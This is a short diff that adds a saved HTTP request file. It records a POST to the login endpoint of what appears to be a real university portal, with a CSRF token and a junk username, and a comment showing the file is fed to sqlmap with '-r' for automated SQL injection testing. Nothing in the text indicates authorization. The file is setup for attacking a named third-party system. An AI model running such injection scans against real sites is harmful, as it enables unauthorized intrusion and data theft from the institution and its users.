@@ -1,0 +1,3 @@
+http://rds3.northsouth.edu:80/index.php/common/login/preLogin (POST)  # .\sqlmap.py -r .\postReqs\nsuportal
+
+csrf_token=9f8e968d3851edd0902aff81f6a88852&username=gfhfghfghfh&commit=Next
